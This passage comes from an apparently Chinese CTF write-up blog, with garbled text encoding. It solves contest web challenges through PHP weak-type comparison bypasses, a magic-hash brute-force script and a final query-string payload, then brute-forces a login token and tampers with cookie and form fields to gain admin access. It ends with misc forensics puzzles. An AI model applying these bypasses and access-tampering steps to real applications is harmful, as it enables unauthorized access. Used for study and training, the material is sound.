class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼ ä¸€ä¸ªjsonæ•°æ®  jsonæ ‡å‡†æ ¼å¼ä¸º<code>&#123;&quot;a&quot;:â€sasdâ€œ,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code><br> is_numeric(@$x2[â€œx21â€])?die(â€œha?â€):NULL;  è¿™é‡Œå¿…é¡»ä¸èƒ½æ˜¯çº¯æ•°å­—ä¸”è¦å¤§äº2017ã€æ€ä¹ˆç»•å‘¢<br> is_numericå‡½æ•°æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä»–ä¼šæŠŠ<code>123asd</code>è¿™ç§å­—ç¬¦ä¸²æ”¹å˜ä¸º 123  ä¹Ÿå°±æ˜¯è¿™ä¹Ÿ(â€˜1234aâ€™ == 1234)ä¸ºçœŸï¼Œä¸”å› phpä¸­å¤§äºå°äºå’Œ==ï¼ˆä¸¤ä¸ªç­‰äºï¼‰æ˜¯ä¸ä¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ç›¸åŒè¿™æ ·çš„è¯ï¼Œå…¶ä¸ºå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¤§äº2017çš„æ•°åŠ ä¸ªå­—ç¬¦ä¸²å°±è¡Œ  å¦‚  200000aaa  <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;&#125;</code>è¿™é‡Œæ³¨æ„  jsonå€¼ä¸ºå­—ç¬¦ä¸²æ—¶è¦åŠ åŒå¼•å·<br>è¿˜æœ‰ä¸€ä¸ªx22  x22éœ€è¦ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”è¦ç­‰äº2ï¼Œcount($x2[â€œx22â€])!==2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">      <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">          <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéå†x22è¿™ä¸ªæ•°ç»„ï¼Œè¦æ±‚ä¸èƒ½å…ƒç´ æ˜¯æœ‰â€XIPUâ€è¿™ä¸ªå­—æ ·ï¼Œä½†æ˜¯è¿˜å¿…é¡»è¦åœ¨æ•°ç»„ä¸­èƒ½å¤Ÿæ‰¾åˆ°ã€‚è¿™é‡Œarray_search()å‡½æ•°æ˜¯å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜çš„ï¼Œå› æ­¤å°†ç¬¬äºŒä¸ªå…ƒç´ è®¾ç½®ä¸º0ï¼Œåœ¨äºâ€XIPUâ€å­—ç¬¦ä¸²æ¯”è¾ƒçš„æ—¶å€™ï¼Œ0==â€XIPUâ€æ˜¯æˆç«‹çš„ã€‚å› ä¸ºxipuä¸­æ²¡æœ‰æ•°å­—ï¼Œæœ€å <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;,&quot;x22&quot;:[[0],0]&#125;</code><br>ç¬¬ä¸‰éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› FALSEã€‚<br>x3ä¸èƒ½ä¸º15562  ä¸”ç©¿çš„å€¼ä¸­è¦æœ‰XIPU,ä¸‹é¢åˆ¤æ–­  15562çš„md5 çš„8-16 ä½è¦å’Œæˆ‘ä»¬ä¼ çš„æ•°ç›¸ç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//45961dd50e46379442318098474e0ced</span></span><br><span class="line"><span class="comment">//0e46379442318098</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ åˆæ˜¯è€ç”Ÿé•¿è°ˆçš„é—®é¢˜   0eæ•°å­—  ä¸”æ¯”è¾ƒçš„æ—¶å€™ä¸º== å¼±ç±»å‹æ¯”è¾ƒä¼šæŠŠ0eæ•°å­—è§£ææˆç§‘å­¦è®¡æ•°æ³•å½¢å¼ä¹Ÿå°±æ˜¯0ï¼Œé‚£æˆ‘ä»¬åªéœ€å†æ‰¾ä¸€ä¸ªè¿™æ ·çš„æ•°å°±è¡Œäº†<br>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">            j = md5_result[<span class="number">10</span>:<span class="number">24</span>]</span><br><span class="line">            <span class="comment">#isdigit()åˆ¤æ–­æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œæ˜¯åˆ™ä¸ºtrue åä¹‹false</span></span><br><span class="line">            <span class="keyword">if</span> j.isdigit():</span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br><span class="line"><span class="comment">#XIPU18570-----&gt;026cba5c0e20905432015695e9eb13ba</span></span><br><span class="line"><span class="comment">#47484XIPU-----&gt;373e838b0e191027496067472b89aa6b</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªéƒ½å¯ä»¥<br>æœ€ç»ˆpayload<code>index.php?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018asd&quot;,&quot;x22&quot;:[[0],0]&#125;&amp;x3=47484XIPU</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154508776.png" alt="image-20220930154508776"></p><h4 id="è·³æ¥è·³å»"><a href="#è·³æ¥è·³å»" class="headerlink" title="è·³æ¥è·³å»"></a>è·³æ¥è·³å»</h4><p>150pt (å·²åšå‡º) ç®€å•è¶Šæƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154824375.png" alt="image-20220930154824375"><br>å¼€å±€ç»™äº†test test ç›´æ¥ç™»å½•<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155017429.png" alt="image-20220930155017429"><br>ç‚¹è¿™ä¸ªç™»å½•æˆåŠŸä¼šè·³è½¬åˆ°adminï¼Œä¸”æç¤ºæƒé™ä¸è¶³ï¼Œæ˜¾ç„¶è¦è¿›è¡Œè¶Šæƒï¼ŒæŠ“ä¸ªåŒ…<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155048535.png" alt="image-20220930155048535"><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155158626.png" alt="image-20220930155158626"><br>è¿™è¾¹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªtokenï¼Œtoken=ad0234829205b9033196ba818f7a872b<br>æ˜¾ç„¶æ˜¯md5è¿‡çš„ è§£ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155257003.png" alt="image-20220930155257003"><br>è¿™é‡Œä¸ºtest2  æˆ‘ä»¬è¿™é‡Œè‚¯å®šè¦adminçš„md5äº†,ä¸è¿‡ç»è¿‡æµ‹è¯•ä¸æ˜¯  adminçš„ ä¹Ÿè¯•äº†ä¸‹admin2 ä¹Ÿä¸æ˜¯  æœæ–­çˆ†ç ´ ï¼Œå…¶å®æ˜¯admin1çš„md5  å•Šè¿™<br>çˆ†ç ´å°±ä¸è´´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155701407.png" alt="image-20220930155701407"></p><h3 id="å„ç§æ”¹header"><a href="#å„ç§æ”¹header" class="headerlink" title="å„ç§æ”¹header"></a>å„ç§æ”¹header</h3><p>150pt (å·²åšå‡º) è€ƒç‚¹ï¼šæ”¹åŒ…<br>å¼€å±€ä¸€ä¸ªé»‘æ¡†ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥å¾€å·¦ä¸Šè§’çœ‹  æœ‰ä¸€ä¸ªpassword.txt  é‚£æ˜¾ç„¶æ˜¯çˆ†ç ´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155942088.png" alt="image-20220930155942088"><br>è®¿é—®ä¹‹  ç›´æ¥å¤åˆ¶ï¼Œè¿™é‡Œä¸ç”¨åœ¨ç”Ÿæˆå¯†ç å­—å…¸æ–‡ä»¶äº†ï¼Œç›´æ¥å¯ä»¥ç²˜è´´ä¸€ä¼šçœ‹ï¼Œéšä¾¿åœ¨å¯†ç å¤„è¾“ç‚¹ä»€ä¹ˆç„¶åæŠ“åŒ…å‘é€åˆ°intruderçˆ†ç ´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160153027.png" alt="image-20220930160153027"><br>ç‚¹clear åªåŠ passwordè¿™ä¸ªå­—æ®µçš„adminä¸ºå˜é‡ï¼Œç‚¹paylaodï¼Œç›´æ¥ç‚¹pasteå°±æŠŠåˆšåˆšåœ¨å¤åˆ¶é‚£è¾¹çš„å¯†ç ç²˜è´´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160401337.png" alt="image-20220930160401337"><br>ç‚¹attackå¼€å§‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160618475.png" alt="image-20220930160618475"></p><p>å¯†ç ä¸ºNsf0cuS æ—¶  å›æ˜¾äº†newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;è§£ä¸€ä¸‹base64ä¸ºï¼š290bca70c7dae93db6644fa00b9d83b9.php<br>è®¿é—®ä¹‹<code>http://ctftime1.usaas.net/web/header/290bca70c7dae93db6644fa00b9d83b9.php</code><br>æ˜¯ä¸€ä¸ªç•™è¨€æ¿<br>éšä¾¿è¾“ç‚¹ä»€ä¹ˆ<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161533441.png" alt="image-20220930161533441"></p><p>è¯´æˆ‘æ²¡ç™»å½•  å› ä¸ºè¿™é‡Œæ²¡æœ‰å¯ç™»å½•çš„åœ°æ–¹ï¼Œæœæ–­æŠ“åŒ…</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161712966.png" alt="image-20220930161712966"><br>è¿™é‡ŒIsLogin=0æ˜¾ç„¶æ˜¯åˆ¤æ–­ç™»é™†äº†æ²¡æœ‰ç›´æ¥æ”¹æˆ1</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162050828.png" alt="image-20220930162050828"></p><p>ç„¶ååˆè¯´æˆ‘æ²¡æœ‰æƒé™ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢content=bohemian&amp;userlevel=guest&amp;Submit=%E7%95%99%E8%A8%80<br>userlevel ä¸ºguest æ˜¾ç„¶è¦æ”¹æˆç®¡ç†å‘˜ï¼Œæ¯”èµ›æ—¶è¯•äº†<code>admin admin1 manager administrator</code> éƒ½ä¸æ˜¯,æœæ–­çˆ†ç ´è¿™ä¸ªåœ°æ–¹  æœ€åæ˜¯<code>root</code> å•Šè¿™</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162139612.png" alt="image-20220930162139612"><br><code>Flag=flag%7Bbbda40bfc4eff921a5f5faf0cfd3c195%7D</code><br><code>Flag=flag&#123;bbda40bfc4eff921a5f5faf0cfd3c195&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="æ–‡ä»¶ä¿®å¤"><a href="#æ–‡ä»¶ä¿®å¤" class="headerlink" title="æ–‡ä»¶ä¿®å¤"></a>æ–‡ä»¶ä¿®å¤</h3><p>å¼€å±€ç»™äº†ä¸€ä¸ªé™„ä»¶ï¼Œè§£å‹ä¹‹æ˜¯ä¸€ä¸ªpdf æµ‹äº†ä¸€æµ‹å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‹–åˆ°winhexä¸­çœ‹ä¸‹åå…­è¿›åˆ¶</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930163312714.png" alt="image-20220930163312714"></p><p>å¾€ä¸‹æ‹‰ä¸€æ‹‰çœ‹åˆ°æœ‰æ’å…¥çš„æ•°æ®ï¼Œåœ¨f æˆ–è€…nåé¢æ˜¯09 æˆ–è€… 20 å¹¶ä¸”éƒ½æ˜¯å…«ä½</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°  æŠŠ09 20 è½¬æˆ 0æˆ–1   å› ä¸ºæ˜¯å…«ä½  æ¯”å¦‚ 01010101è¿™ä¸ªå…«ä½äºŒè¿›åˆ¶å¯ä»¥è½¬æˆ10è¿›åˆ¶ç„¶åè½¬ascii è¿™æ ·å°±æ˜¯å­—ç¬¦äº† </p><p>æœ‰äº†æ€è·¯  å¼€å§‹åšï¼Œè¿™æ ·çš„æ•°æ®é‡  æ‰‹æ’•æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬å†™è„šæœ¬</p><p>å…ˆåœ¨winhexå…¨é€‰å­—ç¬¦ï¼Œå³é”®-ã€‹edit-ã€‹copy block-ã€‹hex value</p><p>å¤åˆ¶å‡ºæ¥  ç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">alist = []</span><br><span class="line"><span class="comment">#line ä¸ºé‚£ä¸€å¤§ä¸²hex valueå€¼</span></span><br><span class="line">line = <span class="string">&quot;255044462D312E3520202009092020090D0A25B5B5B5B520202020202020200D0A312030206F626A0D0A3C3C2F547970652F436174616C6F672F50616765732032203020522F4C616E67287A682D434E&quot;</span></span><br><span class="line"><span class="comment"># å…ˆæŠŠlineä¸¤ä¸¤å­—ç¬¦ä¸€ç»„</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">alist.append(line[i:i+<span class="number">2</span>])</span><br><span class="line"><span class="comment">#åˆ¤æ–­æ¯ç»„çš„å­—ç¬¦æ˜¯ä¸æ˜¯09 æˆ–è€…20  å¹¶ä¸”  åé¢ä¸ƒä½ä¹Ÿå¿…é¡»æ˜¯  09æˆ–20  å› ä¸ºä¸­é—´å¯èƒ½ä¼šæœ‰09æˆ–20 æ‰°ä¹±æˆ‘ä»¬æˆªå–</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)):</span><br><span class="line">    <span class="keyword">if</span> (alist[i] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">1</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">2</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">2</span>] == <span class="string">&quot;20&quot;</span> <span class="keyword">and</span> (alist[i+<span class="number">3</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">3</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">4</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">4</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">5</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">5</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">6</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">6</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">7</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">7</span>] == <span class="string">&quot;20&quot;</span>)):</span><br><span class="line">        s = alist[i]+alist[i+<span class="number">1</span>]+alist[i+<span class="number">2</span>]+alist[i+<span class="number">3</span>]+alist[i+<span class="number">4</span>]+alist[i+<span class="number">5</span>]+alist[i+<span class="number">6</span>]+alist[i+<span class="number">7</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#å°†09æ¢æˆ1    20æ¢æˆ0</span></span><br><span class="line">        s = s.replace(<span class="string">&quot;09&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        s = s.replace(<span class="string">&quot;20&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="comment"># 00011001</span></span><br><span class="line">        <span class="comment"># 00110010D</span></span><br><span class="line">        <span class="comment"># 0110010D0A</span></span><br><span class="line">        <span class="comment"># 0010D0A25B5B5</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A33</span></span><br><span class="line">        <span class="comment"># 01111000</span></span><br><span class="line">        <span class="comment"># x11110000D</span></span><br><span class="line">        <span class="comment"># 1110000D0A</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A35</span></span><br><span class="line">        <span class="comment"># 01100110</span></span><br><span class="line">        <span class="comment"># f001100D0A36</span></span><br><span class="line">        <span class="comment"># 01100D0A360</span></span><br><span class="line">        <span class="comment">#print(alist[i]+alist[i+1]+alist[i+2]+alist[i+3]+alist[i+4]+alist[i+5]+alist[i+6]+alist[i+7])</span></span><br><span class="line">        <span class="comment">#æ­¤æ—¶è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²   ç”¨splitåˆ†å‰²ä¸€ä¸‹</span></span><br><span class="line">        s = s.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment">#åˆ¤æ–­å‡ºæ¥å°äº8çš„å­—ç¬¦ æœ€åè½¬ascii</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;=<span class="number">8</span>:</span><br><span class="line">                i=<span class="string">&#x27;0b&#x27;</span>+i                   </span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#txtflag&#123;EFAWEOFJ4TUW0Tgy&#125;</span></span><br></pre></td></tr></table></figure><p>emmm è¿™é¢˜150ptæ„Ÿè§‰æœ‰ç‚¹äºæ¯”èµ›æ—¶æ²¡æœ‰è§£å‡ºæ¥ï¼Œæ—¶é—´å¤ªçŸ­äº†ï¼Œåé¢å¤ç°çš„</p><h3 id="å¥‡æ€ªçš„å›¾ç‰‡"><a href="#å¥‡æ€ªçš„å›¾ç‰‡" class="headerlink" title="å¥‡æ€ªçš„å›¾ç‰‡"></a>å¥‡æ€ªçš„å›¾ç‰‡</h3><p>å¼€å±€ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ˜¯raræ–‡ä»¶ï¼Œè§£å‹æœ‰å¯†ç ï¼Œé€šå¸¸æ¥è¯´ä¼ªåŠ å¯†ä¸€èˆ¬éƒ½æ˜¯zipè¿™é‡Œåº”è¯¥ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œ<br>foremostç›´æ¥åˆ†ç¦»ï¼Œä¹Ÿä»€ä¹ˆéƒ½æ²¡å‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥stringsæ¢­<br>strings å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶çš„hexæ•°æ®ä¸­çš„å¯æ˜¾å­—ç¬¦è¾“å‡ºå‡ºæ¥</p><p><img 